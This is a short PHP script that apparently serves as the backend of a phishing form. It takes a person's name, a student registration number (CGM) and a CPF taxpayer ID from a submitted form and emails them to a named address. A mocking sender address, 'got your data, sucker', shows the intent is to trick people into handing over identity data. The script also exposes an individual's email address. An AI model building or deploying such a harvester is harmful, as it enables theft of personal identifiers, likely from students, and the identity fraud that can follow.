<?php

    $nome = addslashes($_POST['nome']);
    $cgm = addslashes($_POST['cgm']);
    $cpf = addslashes($_POST['cpf']);

    $para = "filipe.souza@escola.pr.gov.br";
    $assunto = "Coleta de dados - KKK";

    $corpo = "Nome: ".$nome."\n"."CGM ".$cgm."\n"."CPF ".$cpf;

    $cabeca = "From: pegueiteusdadosotariokkk@gmail.com"."\n"."X=Mailer:PHP/".phpversion();

    if(mail($para,$assunto,$corpo,$cabeca)){
        echo("E-mail enviado com sucesso!");
    }else{
        echo("Erro ao enviar!");
    }

?>